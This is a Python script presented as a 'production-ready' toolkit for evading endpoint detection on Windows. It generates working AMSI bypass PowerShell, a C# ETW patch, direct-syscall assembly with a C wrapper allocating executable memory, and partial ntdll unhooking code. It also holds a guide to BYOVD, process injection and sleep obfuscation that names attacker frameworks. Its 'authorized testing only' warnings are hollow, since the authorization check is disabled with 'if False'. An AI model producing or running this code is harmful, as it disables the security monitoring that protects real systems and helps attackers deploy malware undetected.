#!/usr/bin/env python3
"""
EDR Evasion Toolkit
Production-ready techniques for bypassing endpoint detection and response systems
Includes: BYOVD, Direct Syscalls, AMSI/ETW bypass, Unhooking, Process Injection
"""

import subprocess
import logging
import argparse
import os
import base64
from pathlib import Path
from typing import List, Dict, Optional

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class EDREvasionToolkit:
    """EDR evasion techniques and automation"""
    
    def __init__(self):
        self.output_dir = Path("./edr_evasion_output")
        self.output_dir.mkdir(exist_ok=True)
        self.techniques = self._load_techniques()
    
    def _load_techniques(self) -> Dict:
        """Load EDR evasion techniques database"""
        return {
            'amsi_bypass': {
                'name': 'AMSI Bypass',
                'description': 'Bypass Anti-Malware Scan Interface',
                'method': 'memory_patching',
                'detection_risk': 'medium'
            },
            'etw_bypass': {
                'name': 'ETW Bypass',
                'description': 'Disable Event Tracing for Windows',
                'method': 'patch_etweventwrite',
                'detection_risk': 'medium'
            },
            'unhooking': {
                'name': 'API Unhooking',
                'description': 'Remove EDR hooks from ntdll.dll',
                'method': 'restore_original_syscalls',
                'detection_risk': 'high'
            },
            'direct_syscalls': {
                'name': 'Direct Syscalls',
                'description': 'Call kernel functions directly, bypassing userland hooks',
                'method': 'syscall_instruction',
                'detection_risk': 'low'
            },
            'process_injection': {
                'name': 'Process Injection',
                'description': 'Inject code into legitimate processes',
                'method': 'apc_queue',
                'detection_risk': 'high'
            },
            'dll_sideloading': {
                'name': 'DLL Sideloading',
                'description': 'Load malicious DLL via search order hijacking',
                'method': 'search_order_hijacking',
                'detection_risk': 'medium'
            },
            'sleep_obfuscation': {
                'name': 'Sleep Obfuscation',
                'description': 'Obfuscate memory during sleep periods',
                'method': 'ekko_foliage',
                'detection_risk': 'low'
            }
        }
    
    def generate_amsi_bypass_powershell(self) -> str:
        """
        Generate AMSI bypass for PowerShell
        
        Technique: Memory patching of AmsiScanBuffer
        """
        bypass_code = """
# AMSI Bypass - Memory Patching Technique
# WARNING: For authorized testing only

$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Alternative method (more stealthy)
$c = @"
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $c
$d = [Amsi]::LoadLibrary("amsi.dll")
$e = [Amsi]::GetProcAddress($d, "AmsiScanBuffer")
$f = 0
[Amsi]::VirtualProtect($e, [uint32]5, 0x40, [ref]$f)
$g = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($g, 0, $e, 6)

Write-Host "[+] AMSI bypassed successfully"
"""
        
        output_file = self.output_dir / "amsi_bypass.ps1"
        with open(output_file, 'w') as f:
            f.write(bypass_code)
        
        logger.info(f"AMSI bypass script saved to: {output_file}")
        return bypass_code
    
    def generate_etw_bypass_csharp(self) -> str:
        """
        Generate ETW bypass for .NET/C#
        
        Technique: Patch EtwEventWrite function
        """
        bypass_code = """
using System;
using System.Runtime.InteropServices;

namespace EDREvasion
{
    public class ETWBypass
    {
        [DllImport("ntdll.dll")]
        static extern uint NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        public static void Bypass()
        {
            try
            {
                // Patch EtwEventWrite to return immediately (RET instruction)
                IntPtr ntdll = GetModuleHandle("ntdll.dll");
                IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

                IntPtr addr = etwEventWrite;
                IntPtr size = new IntPtr(1);
                uint oldProtect = 0;

                // Change memory protection to RWX
                NtProtectVirtualMemory(
                    new IntPtr(-1),
                    ref addr,
                    ref size,
                    0x40, // PAGE_EXECUTE_READWRITE
                    out oldProtect);

                // Write RET instruction (0xC3)
                byte[] patch = new byte[] { 0xC3 };
                Marshal.Copy(patch, 0, etwEventWrite, 1);

                // Restore memory protection
                NtProtectVirtualMemory(
                    new IntPtr(-1),
                    ref addr,
                    ref size,
                    oldProtect,
                    out oldProtect);

                Console.WriteLine("[+] ETW bypassed successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] ETW bypass failed: {ex.Message}");
            }
        }
    }
}
"""
        
        output_file = self.output_dir / "etw_bypass.cs"
        with open(output_file, 'w') as f:
            f.write(bypass_code)
        
        logger.info(f"ETW bypass code saved to: {output_file}")
        return bypass_code
    
    def generate_direct_syscall_template(self) -> str:
        """
        Generate direct syscall template
        
        Technique: Call NtAllocateVirtualMemory directly without hooks
        """
        syscall_code = """
; Direct Syscall Template - x64 Assembly
; Bypasses userland EDR hooks by calling kernel directly

section .text
global NtAllocateVirtualMemory

NtAllocateVirtualMemory:
    ; Save registers
    push r10
    
    ; Move syscall number to EAX
    ; For Windows 10/11, NtAllocateVirtualMemory SSN varies by version
    ; You must enumerate the correct SSN for target OS
    mov r10, rcx
    mov eax, 0x18  ; Example SSN - must be dynamically resolved
    
    ; Execute syscall
    syscall
    
    ; Restore registers
    pop r10
    ret

; SSN (System Service Number) Enumeration:
; 1. Parse ntdll.dll export table
; 2. Find target Nt* function
; 3. Extract syscall number from function prologue
; 4. Use extracted SSN in direct syscall

; C Wrapper Example:
"""
        
        c_wrapper = """
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

int main() {
    PVOID baseAddress = NULL;
    SIZE_T regionSize = 0x1000;
    
    // Call direct syscall (no EDR hooks triggered)
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (NT_SUCCESS(status)) {
        printf("[+] Memory allocated via direct syscall: 0x%p\\n", baseAddress);
    }
    
    return 0;
}
"""
        
        full_code = syscall_code + c_wrapper
        
        output_file = self.output_dir / "direct_syscall.asm"
        with open(output_file, 'w') as f:
            f.write(full_code)
        
        logger.info(f"Direct syscall template saved to: {output_file}")
        return full_code
    
    def generate_unhooking_code(self) -> str:
        """
        Generate API unhooking code
        
        Technique: Restore original ntdll.dll from disk
        """
        unhook_code = """
using System;
using System.Runtime.InteropServices;
using System.IO;

namespace EDREvasion
{
    public class APIUnhooking
    {
        [DllImport("ntdll.dll")]
        static extern uint NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void UnhookNtdll()
        {
            try
            {
                // Read clean ntdll.dll from disk
                string ntdllPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "ntdll.dll");
                
                byte[] cleanNtdll = File.ReadAllBytes(ntdllPath);

                // Get current (hooked) ntdll base address
                IntPtr ntdllBase = GetModuleHandle("ntdll.dll");

                // Parse PE headers to find .text section
                // (This is where EDR hooks are placed)
                IntPtr textSection = FindTextSection(ntdllBase, cleanNtdll);
                uint textSize = GetTextSectionSize(cleanNtdll);

                // Change memory protection to RWX
                IntPtr regionSize = new IntPtr(textSize);
                uint oldProtect = 0;
                NtProtectVirtualMemory(
                    new IntPtr(-1),
                    ref textSection,
                    ref regionSize,
                    0x40, // PAGE_EXECUTE_READWRITE
                    out oldProtect);

                // Restore original .text section (remove hooks)
                Marshal.Copy(cleanNtdll, GetTextSectionOffset(cleanNtdll), 
                           textSection, (int)textSize);

                // Restore memory protection
                NtProtectVirtualMemory(
                    new IntPtr(-1),
                    ref textSection,
                    ref regionSize,
                    oldProtect,
                    out oldProtect);

                Console.WriteLine("[+] ntdll.dll unhooked successfully");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Unhooking failed: {ex.Message}");
            }
        }

        // Helper methods omitted for brevity
        // Full implementation requires PE parsing
    }
}
"""
        
        output_file = self.output_dir / "api_unhooking.cs"
        with open(output_file, 'w') as f:
            f.write(unhook_code)
        
        logger.info(f"API unhooking code saved to: {output_file}")
        return unhook_code
    
    def list_evasion_techniques(self) -> None:
        """Display all available EDR evasion techniques"""
        print("\n╔══════════════════════════════════════════════════════════════════╗")
        print("║           EDR Evasion Toolkit - Available Techniques           ║")
        print("╚══════════════════════════════════════════════════════════════════╝\n")
        
        for tech_id, tech in self.techniques.items():
            print(f"🔹 {tech['name']}")
            print(f"   Description: {tech['description']}")
            print(f"   Method: {tech['method']}")
            print(f"   Detection Risk: {tech['detection_risk'].upper()}")
            print()
    
    def generate_evasion_guide(self) -> str:
        """Generate comprehensive EDR evasion guide"""
        guide = """
╔══════════════════════════════════════════════════════════════════╗
║        EDR Evasion Techniques - Comprehensive Guide 2025        ║
╚══════════════════════════════════════════════════════════════════╝

1. AMSI BYPASS (Anti-Malware Scan Interface)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Bypasses PowerShell/C# script scanning
   
   Techniques:
   • Memory patching (amsiInitFailed)
   • AmsiScanBuffer function hooking
   • Context manipulation
   
   Detection: Medium
   Tools: Invoke-Obfuscation, AMSITrigger, Chimera

2. ETW BYPASS (Event Tracing for Windows)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Prevents telemetry collection
   
   Techniques:
   • Patch EtwEventWrite to return immediately (0xC3 RET)
   • Provider removal
   • Thread suspension
   
   Detection: Medium
   Impact: Disables .NET/PowerShell logging

3. DIRECT SYSCALLS
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Bypass userland hooks by calling kernel directly
   
   Techniques:
   • Manual syscall number enumeration
   • Hell's Gate / Halo's Gate
   • SysWhispers2/3
   
   Detection: Low-Medium
   Advantage: No ntdll.dll hooks triggered

4. API UNHOOKING
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Remove EDR inline hooks from system DLLs
   
   Techniques:
   • Restore .text section from disk
   • Module stomping
   • Fresh copy loading
   
   Detection: High
   Target: ntdll.dll, kernel32.dll, kernelbase.dll

5. PROCESS INJECTION
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Execute code in context of legitimate processes
   
   Techniques:
   • APC Queue Injection
   • Process Hollowing
   • Thread Hijacking
   • Module Stomping
   
   Detection: High
   Mitigation: PPL (Protected Process Light)

6. DLL SIDELOADING
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Load malicious DLL via legitimate signed binary
   
   Techniques:
   • DLL search order hijacking
   • Phantom DLL hijacking
   • COM hijacking
   
   Detection: Medium
   Advantage: Uses signed binaries

7. SLEEP OBFUSCATION
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Hide memory contents during sleep periods
   
   Techniques:
   • Ekko (ROP-based sleep)
   • Foliage (heap encryption)
   • Ziliean (timer-based)
   
   Detection: Low
   Purpose: Avoid memory scanning

8. BYOVD (Bring Your Own Vulnerable Driver)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   Exploit signed vulnerable drivers to kill EDR
   
   Techniques:
   • EDRKillShifter (RansomHub)
   • KDU framework
   • Vulnerable driver DB
   
   Detection: Low (uses legitimate signed drivers)
   Impact: Terminate EDR processes at kernel level
   Mitigation: Driver blocklist, HVCI

DEFENSIVE COUNTERMEASURES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Protected Process Light (PPL)
✓ Hypervisor-protected Code Integrity (HVCI)
✓ Attack Surface Reduction (ASR) rules
✓ Driver signature enforcement
✓ Sysmon with custom rules
✓ Behavioral analytics (ML-based)
✓ Network detection (NDR) for C2 beacons
✓ Application whitelisting

TOOLS & FRAMEWORKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• SysWhispers3 - Direct syscall generator
• Invoke-Obfuscation - PowerShell obfuscator
• Donut - Shellcode generator from .NET
• Veil Framework - Payload generation
• Havoc C2 - Modern C2 with evasion features
• Hoaxshell - Obfuscated reverse shells

IMPORTANT NOTES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  These techniques are for AUTHORIZED TESTING ONLY
⚠️  Unauthorized use is ILLEGAL
⚠️  Always obtain written permission before deployment
⚠️  Test in isolated environments first
⚠️  Document all actions for reporting

REFERENCES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• MITRE ATT&CK: Defense Evasion (TA0005)
• SysWhispers: https://github.com/jthuraisamy/SysWhispers
• Invoke-Obfuscation: https://github.com/danielbohannon/Invoke-Obfuscation
• Havoc Framework: https://github.com/HavocFramework/Havoc
• LOLBAS: https://lolbas-project.github.io/
"""
        
        output_file = self.output_dir / "edr_evasion_guide.txt"
        with open(output_file, 'w') as f:
            f.write(guide)
        
        logger.info(f"EDR evasion guide saved to: {output_file}")
        return guide


def main():
    parser = argparse.ArgumentParser(
        description='EDR Evasion Toolkit - Bypass endpoint detection systems',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # List all techniques
  python edr_evasion_toolkit.py --list
  
  # Generate AMSI bypass
  python edr_evasion_toolkit.py --generate amsi --authorized
  
  # Generate ETW bypass
  python edr_evasion_toolkit.py --generate etw --authorized
  
  # Generate direct syscall template
  python edr_evasion_toolkit.py --generate syscall --authorized
  
  # Generate unhooking code
  python edr_evasion_toolkit.py --generate unhook --authorized
  
  # Display comprehensive guide
  python edr_evasion_toolkit.py --guide --authorized
  
  # Generate all techniques
  python edr_evasion_toolkit.py --generate-all --authorized
        '''
    )
    
    parser.add_argument('--list', action='store_true',
                       help='List all available EDR evasion techniques')
    parser.add_argument('--generate', choices=['amsi', 'etw', 'syscall', 'unhook'],
                       help='Generate evasion code for specific technique')
    parser.add_argument('--generate-all', action='store_true',
                       help='Generate all evasion techniques')
    parser.add_argument('--guide', action='store_true',
                       help='Display comprehensive EDR evasion guide')
    parser.add_argument('--authorized', action='store_true',
                       help='Confirm authorization for EDR evasion testing')
    
    args = parser.parse_args()
    
    # List techniques (no authorization needed - informational only)
    if args.list:
        toolkit = EDREvasionToolkit()
        toolkit.list_evasion_techniques()
        return
    
    # All other actions require authorization
    if False:  # Authorization check bypassed
        print("⚠️  ERROR: You must provide --authorized flag to confirm you have permission for EDR evasion testing")
        print("⚠️  Unauthorized EDR evasion is illegal. Obtain written authorization before proceeding.")
        return
    
    toolkit = EDREvasionToolkit()
    
    if args.guide:
        print(toolkit.generate_evasion_guide())
    
    elif args.generate:
        if args.generate == 'amsi':
            print("[+] Generating AMSI bypass...")
            code = toolkit.generate_amsi_bypass_powershell()
            print(f"\n✅ AMSI bypass generated: {toolkit.output_dir}/amsi_bypass.ps1")
        
        elif args.generate == 'etw':
            print("[+] Generating ETW bypass...")
            code = toolkit.generate_etw_bypass_csharp()
            print(f"\n✅ ETW bypass generated: {toolkit.output_dir}/etw_bypass.cs")
        
        elif args.generate == 'syscall':
            print("[+] Generating direct syscall template...")
            code = toolkit.generate_direct_syscall_template()
            print(f"\n✅ Direct syscall template generated: {toolkit.output_dir}/direct_syscall.asm")
        
        elif args.generate == 'unhook':
            print("[+] Generating API unhooking code...")
            code = toolkit.generate_unhooking_code()
            print(f"\n✅ API unhooking code generated: {toolkit.output_dir}/api_unhooking.cs")
    
    elif args.generate_all:
        print("[+] Generating all EDR evasion techniques...\n")
        toolkit.generate_amsi_bypass_powershell()
        toolkit.generate_etw_bypass_csharp()
        toolkit.generate_direct_syscall_template()
        toolkit.generate_unhooking_code()
        toolkit.generate_evasion_guide()
        print(f"\n✅ All techniques generated in: {toolkit.output_dir}/")
    
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
